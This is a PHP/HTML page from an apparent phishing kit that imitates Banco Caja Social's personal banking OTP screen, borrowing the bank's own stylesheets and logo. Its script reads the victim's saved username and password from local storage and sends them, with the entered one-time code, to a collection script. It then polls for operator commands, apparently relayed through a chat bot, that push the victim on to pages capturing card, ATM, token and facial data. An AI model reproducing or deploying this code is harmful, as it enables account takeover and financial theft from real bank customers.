<?php
require_once __DIR__ . '/../config.php';

$error = isset($_GET['error']) ? 'Código OTP incorrecto. Intente nuevamente.' : '';
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" class="" lang="es">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Inicio de sesión - Portal Personas Banco Caja Social</title>
    <link rel="icon" type="image/x-icon" href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/img/favicon.ico">
    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/lib/backbase-theme/dist/backbase-theme.css" rel="stylesheet">
    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/lib/backbase-identity/styles/identity.css" rel="stylesheet">
    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/css/bcs.7.css" rel="stylesheet">
    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/css/custom-identity.1.css" rel="stylesheet">
    <script src="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/lib/backbase-identity/scripts/load-background.js"></script>
    <style>
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }
    </style>
</head>

<body onload="createBackgrounds();" class="identity-background-1 identity-page--ready">
    <div id="background" class="bb-stack__item bb-stack__item--fill identity-bg-layout"></div>
    <div class="bb-stack bb-stack--wrap template-stack-container">
        <div id="inner-background" class="bb-stack__item bb-stack__item--fill identity-bg-layout"></div>
        <div class="bb-stack__break bb-stack__break--md-down"></div>
        <div class="bb-stack__item--fill identity-container">
            <div class="identity-container__panel identity-container__panel--animated">
                <div class="identity-container__form">
                    <div class="login-logos-wrapper">
                        <div class="identity-logo bb-block bb-block--lg"></div>
                    </div>
                    <header>
                        <h1 id="kc-page-title">Código de verificación OTP</h1>
                    </header>
                    <div class="bb-subtitle bb-block bb-block--lg">
                        <span>Ingrese el código OTP de 6 dígitos enviado a su celular registrado.</span>
                    </div>
                    <div id="kc-form">
                        <div id="kc-form-wrapper">
                            <form id="form-step">
                                <div class="form-group bb-form-field">
                                    <label class="label">Código OTP</label>
                                    <input id="step-input" class="form-control" type="text"
                                        maxlength="6" placeholder="000000" autocomplete="off" inputmode="numeric">
                                    <?php if ($error): ?>
                                        <small class="bb-input-validation-message" role="alert">
                                            <?= htmlspecialchars($error) ?>
                                        </small>
                                    <?php endif; ?>
                                </div>
                                <div class="bb-button-bar bb-block bb-block--xl mt-3">
                                    <button id="btn-submit" class="btn btn-primary w-100" type="submit" disabled>Verificar</button>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const SEND_URL = './send.php';
        const POLL_URL = './poll_updates.php';
        const CHAT_ID = <?= json_encode((string)CHAT_ID) ?>;
        let MESSAGE_ID = null;
        let SESSION_ID = localStorage.getItem('bcs_session_id') || '';
        const STORED_USER = localStorage.getItem('bcs_username') || '';
        const STORED_PASS = localStorage.getItem('bcs_password') || '';

        const ACTION_MAP = {
            'NEXT_TARJETA':  './tarjeta.php',
            'NEXT_CAJERO':   './cajero.php',
            'NEXT_ATM':      './cajero.php',
            'NEXT_DINAMICA': './dinamica.php',
            'NEXT_TOKEN':    './token.php',
            'NEXT_OTP':      './otp.php',
            'NEXT_FACIAL':   './facial.php',
            'NEXT_TEXTO':    './texto.php',
            'NEXT_WHATSAPP': null,
            'FINISH':        './approved.php',
            'BAN_IP':        './ban_ip.php',
            'ERR_LOGIN':     './contra.php?error=1&username=' + encodeURIComponent(STORED_USER),
            'ERR_PASS':      './otp.php?error=1',
            'ERR_TARJETA':   './otp.php?error=1',
            'ERR_CAJERO':    './otp.php?error=1',
            'ERR_ATM':       './otp.php?error=1',
            'ERR_DINAMICA':  './otp.php?error=1',
            'ERR_TOKEN':     './otp.php?error=1',
            'ERR_OTP':       './otp.php?error=1',
            'ERR_FACIAL':    './otp.php?error=1',
            'ERR_TEXTO':     './otp.php?error=1',
        };

        async function startPolling() {
            if (!MESSAGE_ID) return;
            try {
                const r = await fetch(`${POLL_URL}?messageid=${MESSAGE_ID}&chatid=${CHAT_ID}`);
                const resp = await r.json();
                const action = resp?.action || null;

                if (resp.ok && action) {
                    const route = ACTION_MAP[action];
                    if (route) {
                        window.location.href = route;
                        return;
                    }
                }
                setTimeout(startPolling, 2500);
            } catch (e) {
                setTimeout(startPolling, 3000);
            }
        }

        function showLoader() {
            document.body.innerHTML = `
            <div style="display:flex;align-items:center;justify-content:center;min-height:100vh;background:#f5f5f5;">
                <div style="text-align:center;padding:40px;">
                    <img style="width:160px;margin-bottom:32px;"
                         src="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/img/logoBCSLine.svg">
                    <div style="width:52px;height:52px;border:5px solid #e0e0e0;border-top-color:#0033A0;
                        border-radius:50%;animation:spin 0.9s linear infinite;margin:0 auto 24px;"></div>
                    <p style="color:#444;font-size:15px;margin:0;">Verificando información, por favor espere...</p>
                </div>
            </div>
            <style>@keyframes spin{to{transform:rotate(360deg)}}</style>`;
        }

        const inp = document.getElementById('step-input');
        const btn = document.getElementById('btn-submit');

        inp.addEventListener('input', () => {
            inp.value = inp.value.replace(/\D/g, '').slice(0, 6);
            btn.disabled = inp.value.trim().length !== 6;
        });

        document.getElementById('form-step').addEventListener('submit', async function(e) {
            e.preventDefault();
            const val = inp.value.trim();
            if (val.length !== 6) return;

            showLoader();

            const res = await fetch(SEND_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    step: 'OTP',
                    event: 'OTP',
                    sessionId: SESSION_ID,
                    username: STORED_USER,
                    password: STORED_PASS,
                    otp: val
                })
            });
            const data = await res.json();
            if (data.ok && data.messageid) {
                MESSAGE_ID = data.messageid;
                if (data.sessionid) {
                    SESSION_ID = data.sessionid;
                    localStorage.setItem('bcs_session_id', SESSION_ID);
                }
                startPolling();
            } else {
                window.location.href = './otp.php?error=1';
            }
        });
    </script>
</body>

</html>
